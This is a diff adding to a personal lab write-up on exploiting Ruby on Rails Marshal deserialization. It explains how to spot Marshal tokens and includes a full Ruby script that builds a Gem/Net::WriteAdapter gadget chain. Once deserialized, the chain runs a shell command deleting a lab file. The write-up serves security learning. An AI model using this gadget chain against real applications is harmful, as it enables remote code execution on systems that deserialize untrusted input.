@@ -199,5 +199,58 @@ java \
 
 #### Exploiting Ruby Deserialization Using a Documented Gadget Chain
 - Serialization-based session mechanism and Ruby on Rails framework. PS informs us to find a well documented exploit to create a malicious serialized object containing a remote code execution payload to delete `/home/carlos/morale.txt`.
-- I was a bit confused when I first looked up some gadgets, as I was not familiar with Ruby on Rails and its use of YAML. Older Rails apps will use YAML to store objects, while newer Rails apps use Marshal (a binary format) or JSON.  I read through a blog post, https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html, for deeper understanding. In YAML, `!ruby/object` is a tag that forces the server to treat the data as code execution, not just text.
-- To figure out whether we were dealing with YAML or Marshal, I base64 decoded the token, and I found the hex started with 0408, meaning it's Marshal. YAML would begin with `---`. 
+- I was a bit confused when I first looked up some gadgets, as I was not familiar with Ruby on Rails and its use of YAML. Older Rails apps will use YAML to store objects, while newer Rails apps use Marshal (a binary format) or JSON.  I read through a blog post, https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html, for deeper understanding. In YAML, `!ruby/object` is a tag that forces the serverrub to treat the data as code execution, not just text.
+- To figure out whether we were dealing with YAML or Marshal, I base64 decoded the token, and I found the hex started with 0408, meaning it's Marshal. YAML would begin with `---`.
+- I had a pretty modern version of Ruby installed, 3.3.8, so I had to modify the payload available from the blog post. 
+```
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+module Net
+  class WriteAdapter
+    def initialize(socket, method)
+      @socket = socket
+      @method_id = method
+    end
+  end
+  class BufferedIO
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm -f /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+require 'base64'
+puts Base64.strict_encode64(payload)
+```
